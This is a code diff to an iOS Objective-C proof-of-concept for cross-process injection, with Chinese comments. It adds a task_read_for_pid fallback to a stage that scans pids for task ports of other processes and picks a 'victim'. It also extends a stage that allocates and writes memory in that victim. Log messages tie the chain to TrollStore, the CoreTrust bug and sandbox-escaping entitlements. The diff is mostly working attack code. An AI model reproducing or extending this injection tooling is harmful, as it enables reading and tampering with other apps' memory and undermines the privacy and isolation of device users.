@@ -29,6 +29,12 @@ extern kern_return_t task_for_pid(mach_port_name_t target_tport,
                                   int              pid,
                                   mach_port_name_t *t);
 
+// 只读 task port 通道：对应 entitlement com.apple.system-task-ports.read，
+// 权限低于 task_for_pid，但可读目标内存（iOS 14+ 引入，AMFI 检查更宽松）
+extern kern_return_t task_read_for_pid(mach_port_name_t target_tport,
+                                       int              pid,
+                                       mach_port_name_t *t);
+
 extern kern_return_t mach_vm_allocate(vm_map_t           target,
                                       mach_vm_address_t  *address,
                                       mach_vm_size_t     size,
@@ -69,48 +75,81 @@ static void POCLog(NSString *line) {
 typedef struct {
     pid_t       pid;
     mach_port_t task;
+    int         read_only;   // 1 = 只读 port（task_read_for_pid 所得）
 } POCVictim;
 
 #pragma mark - 阶段 A：task_for_pid
 
 static POCVictim POC_StageA(void) {
-    POCVictim victim = { -1, MACH_PORT_NULL };
+    POCVictim victim = { -1, MACH_PORT_NULL, 0 };
 
     POCLog(@"===== 阶段 A：task_for_pid 权限验证 =====");
 
-    pid_t selfPid = getpid();
-    int   ok      = 0;
-    int   others  = 0;
+    pid_t selfPid     = getpid();
+    int   others_full = 0;
+    int   others_read = 0;
+
+    // task_for_pid 失败错误码分布（最多记 8 种），用于远程判定拦截层
+    kern_return_t errKeys[8];
+    int           errCounts[8];
+    int           errN = 0;
 
     for (pid_t pid = 1; pid < 5000; pid++) {
         mach_port_t   task = MACH_PORT_NULL;
         kern_return_t kr   = task_for_pid(mach_task_self(), pid, &task);
 
-        if (kr == KERN_SUCCESS && task != MACH_PORT_NULL) {
-            ok++;
-            if (pid != selfPid) {
-                others++;
-                // 保留第一个「非自身」进程作为阶段 B 的操作对象
-                if (victim.task == MACH_PORT_NULL) {
-                    victim.pid  = pid;
-                    victim.task = task;
-                }
-                if (others <= 8) {
-                    POCLog([NSString stringWithFormat:@"  pid=%d  task=0x%08X  [OK]", pid, task]);
-                }
+        if (kr != KERN_SUCCESS) {
+            int found = 0;
+            for (int i = 0; i < errN; i++)
+                if (errKeys[i] == kr) { errCounts[i]++; found = 1; break; }
+            if (!found && errN < 8) { errKeys[errN] = kr; errCounts[errN] = 1; errN++; }
+            continue;
+        }
+        if (task == MACH_PORT_NULL) continue;
+        if (pid == selfPid) continue;
+
+        others_full++;
+        if (victim.task == MACH_PORT_NULL) {
+            victim.pid = pid; victim.task = task; victim.read_only = 0;
+        }
+        if (others_full <= 8)
+            POCLog([NSString stringWithFormat:@"  task_for_pid pid=%d  [OK 完整]", pid]);
+    }
+
+    // 完整通道全灭时，试只读通道
+    if (others_full == 0) {
+        for (pid_t pid = 1; pid < 5000; pid++) {
+            mach_port_t   task = MACH_PORT_NULL;
+            kern_return_t kr   = task_read_for_pid(mach_task_self(), pid, &task);
+            if (kr != KERN_SUCCESS || task == MACH_PORT_NULL || pid == selfPid) continue;
+
+            others_read++;
+            if (victim.task == MACH_PORT_NULL) {
+                victim.pid = pid; victim.task = task; victim.read_only = 1;
             }
+            if (others_read <= 8)
+                POCLog([NSString stringWithFormat:@"  task_read_for_pid pid=%d  [OK 只读]", pid]);
         }
     }
 
-    if (others == 0) {
-        POCLog([NSString stringWithFormat:@"结果：FAILED  可访问进程数=%d（仅自身=%d）", ok, selfPid]);
-        POCLog(@"判定：entitlement 未生效，注入链路不成立");
-        POCLog(@"排查 1：ent.plist 是否随 IPA 一起打包并参与签名");
-        POCLog(@"排查 2：TrollStore 是否以 System App 方式安装");
-        POCLog(@"排查 3：iOS 小版本是否超出 CoreTrust 漏洞可用范围");
+    NSMutableString *eb = [NSMutableString string];
+    for (int i = 0; i < errN; i++)
+        [eb appendFormat:@"0x%X(%d次) ", errKeys[i], errCounts[i]];
+    if (errN)
+        POCLog([NSString stringWithFormat:@"task_for_pid 错误分布: %@", eb]);
+
+    if (others_full == 0 && others_read == 0) {
+        POCLog(@"结果：FAILED  两种通道均可访问其他进程 0 个");
+        POCLog(@"判定：当前安装方式下 entitlement 未被 AMFI 放行");
+        POCLog(@"排查 1：是否用『Install as System App』方式安装（no-sandbox 必需）");
+        POCLog(@"排查 2：是否为 C 版（含 platform-application）；B 版无 no-sandbox 本就受限");
+        POCLog(@"排查 3：iOS 小版本是否超出 TrollStore (CoreTrust) 适用范围");
+    } else if (others_full > 0) {
+        POCLog([NSString stringWithFormat:@"结果：PASSED  完整 task_for_pid 可用，其他进程 %d 个，样本 pid=%d", others_full, victim.pid]);
+        POCLog(@"判定：已具备跨进程完整访问能力，可继续阶段 B");
     } else {
-        POCLog([NSString stringWithFormat:@"结果：PASSED  可访问其他进程 %d 个，样本 pid=%d", others, victim.pid]);
-        POCLog(@"判定：已具备跨进程访问能力，可继续阶段 B");
+        POCLog([NSString stringWithFormat:@"结果：PARTIAL  完整端口 0 个，只读端口 %d 个（样本 pid=%d）", others_read, victim.pid]);
+        POCLog(@"判定：仅只读通道生效；写入/注入仍需完整权限（C 版 + System App 安装）");
     }
     return victim;
 }
@@ -124,7 +163,12 @@ static void POC_StageB(POCVictim victim) {
     }
 
     POCLog(@"===== 阶段 B：远程内存读写验证 =====");
-    POCLog([NSString stringWithFormat:@"目标 pid=%d", victim.pid]);
+    POCLog([NSString stringWithFormat:@"目标 pid=%d（%s port）", victim.pid, victim.read_only ? "只读" : "完整"]);
+    if (victim.read_only) {
+        POCLog(@"目标为只读 port：写入验证需完整 task_for_pid（C 版 + System App 安装后再测）");
+        POCLog(@"阶段 B 结束（只读通道已证明跨进程访问链路部分打通）");
+        return;
+    }
 
     // 1. 在目标进程分配内存
     mach_vm_address_t remote = 0;
